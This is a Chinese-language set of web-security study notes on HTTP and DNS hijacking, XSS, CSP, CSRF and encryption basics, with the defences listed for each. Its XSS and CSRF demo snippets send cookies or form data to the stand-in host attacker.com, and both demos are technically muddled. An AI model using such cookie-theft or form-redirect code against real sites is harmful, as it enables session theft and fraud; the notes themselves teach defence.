
# HTTP 劫持、DNS 劫持与 XSS

- http 劫持是指攻击者在客户端和服务器之间同时建立了连接通道，通过某种方式，让客户端请求发送到自己的服务器，然后自己就拥有了控制响应内容的能力，从而给客户端展示错误的信息，比如在页面中加入一些广告内容。
- DNS 劫持是指攻击者劫持了 DNS 服务器，获得了修改 DNS 解析记录的权限，从而导致客户端请求的域名被解析到了错误的 IP 地址，攻击者通过这种方式窃取用户资料或破坏原有正常服务。
- XSS 是指跨站脚本攻击。攻击者利用站点的漏洞，在表单提交时，在表单内容中加入一些恶意脚本，当其他正常用户浏览页面，而页面中刚好出现攻击者的恶意脚本时，脚本被执行，从而使得页面遭到破坏，或者用户信息被窃取。
- 要防范 XSS 攻击，需要在服务器端过滤脚本代码，将一些危险的元素和属性去掉或对元素进行HTML实体编码。

# 什么是 CSP？
CSP（Content-Security-Policy）指的是内容安全策略，它的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦
截由浏览器自己来实现。

通常有两种方式来开启 CSP
- 一种是设置 HTTP 首部中的Content-Security-Policy
  
- 一种是设置 meta 标签的方式
   <meta http-equiv="Content-Security-Policy">
   
CSP 也是解决 XSS 攻击的一个强力手段

# xss和csrf 攻击


## XSS：

- XSS 是指跨站脚本攻击。攻击者利用站点的漏洞，在表单提交时，在表单内容中加入一些恶意脚本，当其他正常用户浏览页面，而页面中刚好出现攻击者的恶意脚本时，脚本被执行，从而使得页面遭到破坏，或者用户信息被窃取。

- 攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。


- 要防范 XSS 攻击，需要在服务器端过滤脚本代码，将一些危险的元素和属性去掉或对元素进行HTML实体编码。

```javascript
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>XSS Attack Demo</title>
</head>
<body>
  <h1>XSS Attack Demo</h1>
  <div id="content"></div>
  <script src="payload.js"></script>
</body>
</html>


// payload.js
const maliciousScript = `
  const xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);
  xhr.send();
`;

document.getElementById('content').innerHTML = maliciousScript;

```
在上述示例中，恶意脚本payload.js被注入到页面中。该脚本通过XMLHttpRequest发送GET请求，将页面中的Cookie信息发送给攻击者控制的服务器。


### XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。



- 1、反射型 （Reflected XSS ） 发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以叫反射型XSS。

- 2、存储型存  Stored XSS和 Reflected XSS的差别就在于，具有攻击性的脚本被保存到了服务器端（数据库，内存，文件系统）并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。

- 3、DOM型 （DOM-based or local XSS） 即基于DOM或本地的 XSS 攻击：其实是一种特殊类型的反射型 XSS，它是基于 DOM文档对象模型的一种漏洞。可以通过 DOM来动态修改页面内容，从客户端获取 DOM中的数据并在本地执行。基于这个特性，就可以利用 JS脚本来实现 XSS漏洞的利用。

### 防范手段：
1. 输入过滤
2. 输出过滤
3. 加httponly 请求头  锁死cookie

## CSRF：Cross-site request forgery

```dotnetcli
1.  用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
2.  在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
3.  用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
4.  网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5.  浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 
```

```javascript
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Attack Demo</title>
</head>
<body>
  <h1>CSRF Attack Demo</h1>
  <form id="transfer-form" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="submit" value="Transfer">
  </form>
  <script src="payload.js"></script>
</body>
</html>
// payload.js
const maliciousScript = `
  const form = document.getElementById('transfer-form');
  form.action = 'http://attacker.com/steal-data';
  form.submit();`;

eval(maliciousScript);
```
在上述示例中，恶意脚本payload.js被执行。该脚本修改了表单transfer-form的目标地址为攻击者控制的服务器，并提交表单。当用户点击"Transfer"按钮时，实际上会向攻击者服务器发送用户的敏感数据。


防御 CSRF 攻击有多种手段：

- 不使用cookie
- 为表单添加校验的 token 校验
- cookie中使用sameSite字段
- 服务器检查 referer 字段



# 身份验证过程中会涉及到密钥，对称加密，非对称加密，摘要的概念，请解释一下

密钥

密钥是一种参数，它是在明文转换为密文或将密文转换为明文的算法中输入的参数。密钥分为对称密钥与非对称密钥，分别应用在对称加密和非对称加密上。

对称加密

对称加密又叫做私钥加密，即信息的发送方和接收方使用同一个密钥去加密和解密数据。对称加密的特点是算法公开、加密和解密速度快，适合于对大数据量进行加密，常见的对称加密算法有 DES、3DES、TDEA、Blowfish、RC5 和 IDEA。

非对称加密

非对称加密也叫做公钥加密。非对称加密与对称加密相比，其安全性更好。对称加密的通信双方使用相同的密钥，如果一方的密钥遭泄露，那么整个通信就会被破解。而非对称加密使用一对密钥，即公钥和私钥，且二者成对出现。私钥被自己保存，不能对外泄露。公钥指的是公共的密钥，任何人都可以获得该密钥。用公钥或私钥中的任何一个进行加密，用另一个进行解密。

摘要

摘要算法又称哈希/散列算法。它通过一个函数，把任意长度的数据转换为一个长度固定的数据串（通常用 16 进制的字符串表示）。算法不可逆。


# 什么时候用的对称加密什么时候非对称加密

建立通信阶段使用非对称性加密，建立完毕后使用对称性加密进行传输



